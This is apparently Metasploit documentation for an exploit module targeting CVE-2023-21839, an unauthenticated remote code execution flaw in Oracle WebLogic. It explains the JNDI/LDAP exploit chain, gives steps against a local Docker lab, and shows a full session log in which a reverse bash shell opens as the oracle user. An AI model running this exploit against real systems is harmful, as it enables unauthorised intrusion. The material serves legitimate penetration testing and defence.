## Vulnerable Application

### Description
Oracle Weblogic 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0 prior to the Jan 2023 security update are vulnerable to an unauthenticated
remote code execution vulnerability due to a post deserialization vulnerability. This occurs when an attacker serializes
a `ForeignOpaqueReference` class object, deserializes it on the target, and then post deserialization, calls the
object's `getReferent()` method, which will make use of the `ForeignOpaqueReference` class's `remoteJNDIName` variable,
which is under the attackers control, to do a remote loading of the JNDI address specified by `remoteJNDIName` via
the `lookup()` function.

This can in turn lead to a deserialization vulnerability whereby an attacker supplies the address of a HTTP server hosting
a malicious Java class file, which will then be loaded into the Oracle Weblogic process's memory and an attempt to
create a new instance of the attacker's class will be made. Attackers can utilize this to execute arbitrary Java
code during the instantiation of the object, thereby getting remote code execution as the `oracle` user.

This module exploits this vulnerability to trigger the JNDI connection to a LDAP server we control. The LDAP server will
then respond with a remote reference response that points to a HTTP server that we control, where the malicious Java
class file will be hosted. Oracle Weblogic will then make a HTTP request to retrieve the malicious Java class file,
at which point our HTTP server will serve up the malicious class file and Oracle Weblogic will instantiate
an instance of that class, granting us RCE as the `oracle` user.

This vulnerability was exploited in the wild as noted by KEV on May 1st 2023: https://www.fortiguard.com/outbreak-alert/oracle-weblogic-server-vulnerability

## Verification Steps

1. Make sure you have Docker and Docker Compose installed. If not follow https://docs.docker.com/engine/install.
2. `git clone git@github.com:vulnhub/vulnhub.git`
3. `cd weblogic/CVE-2023-21839/cmd`
4. `docker-compose up -d` and wait for the build to finish, then a few seconds for startup.
5. Do: `use exploit/multi/iiop/cve_2023_21839_weblogic_rce`
6. Do `set SRVPORT *some high port*` for LDAP server port number since we can't listen on the default port `389` without being `root`.
7. Do `set HTTP_SRVPORT *port*` if you want to change the HTTP server port.
8. Do `set RHOSTS 127.0.0.1` to target the local Docker instance.
9. Do `set SRVHOST *LDAP server IP address*` for LDAP server host. NOTE: Have to provide a routeable IP address, 0.0.0.0 won't work.
10. Do `set LHOST *IP address of Metasploit machine*`
11. Do: `exploit`
12. Verify that you get a shell on the target system as the `oracle` user.


## Options

### HTTP_SRVPORT
The port where the HTTP server will listen.

### SRVPORT
The port where the LDAP server will listen.

### SRVHOST
The IP address where where the LDAP server will be listening.

## Scenarios

### Oracle Weblogic 12.2.1.3 with Java 1.8.0_151-b12 - Docker Image
```
msf6 exploit(multi/iiop/cve_2023_21839_weblogic_rce) > show options

Module options (exploit/multi/iiop/cve_2023_21839_weblogic_rce):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HTTP_SRVPORT  8089             yes       The HTTP server port
   LDIF_FILE                      no        Directory LDIF file path
   RHOSTS        127.0.0.1        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT         7001             yes       The target port (TCP)
   SRVHOST       192.168.204.149  yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT       4939             yes       The local port to listen on.


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.204.149  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux



View the full module info with the info, or info -d command.

msf6 exploit(multi/iiop/cve_2023_21839_weblogic_rce) > check
[+] 127.0.0.1:7001 - The target is vulnerable. Target is a Oracle WebServer 12.2.1.3 server, and is vulnerable!
msf6 exploit(multi/iiop/cve_2023_21839_weblogic_rce) > exploit

[*] Started reverse TCP handler on 192.168.204.149:4444 
[*] 127.0.0.1:7001 - Running automatic check ("set AutoCheck false" to disable)
[+] 127.0.0.1:7001 - The target is vulnerable. Target is a Oracle WebServer 12.2.1.3 server, and is vulnerable!
[*] 127.0.0.1:7001 - 1. Making T3 connection...
[+] 127.0.0.1:7001 - Made T3 connection!
[*] 127.0.0.1:7001 - 2. Sending first GIOP LocateRequest packet
[+] 127.0.0.1:7001 - Step 2 complete!
[*] 127.0.0.1:7001 - 3. Sending rebindAny request!
[+] 127.0.0.1:7001 - Step 3 complete!
[*] 127.0.0.1:7001 - 4. Sending second rebindAny request!
[+] 127.0.0.1:7001 - Step 4 complete!
[*] 127.0.0.1:7001 - 5. Sending second GIOP LocateRequest packet
[+] 127.0.0.1:7001 - Step 5 complete!
[*] 127.0.0.1:7001 - 6. Sending resolve packet #1 with wls_key_1
[+] 127.0.0.1:7001 - Step 6 complete!
[*] 127.0.0.1:7001 - Serving Java code on: http://192.168.204.149:8089/PayloadRuns.class
[*] 127.0.0.1:7001 - 7. Sending resolve packet #2 with wls_key_2
[+] 127.0.0.1:7001 - Step 7 complete!
[*] 127.0.0.1:7001 - Sleeping for 8 seconds to allow LDAP and HTTP traffic to go through.
[*] Command shell session 1 opened (192.168.204.149:4444 -> 172.18.0.2:46440) at 2023-05-17 16:48:56 -0500

id
uid=1000(oracle) gid=1000(oracle) groups=1000(oracle)
whoami
oracle
uname -a 
Linux 8e6d76ecdb0d 5.19.0-41-generic #42~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Tue Apr 18 17:40:00 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
pwd
/u01/oracle/user_projects/domains/base_domain
```
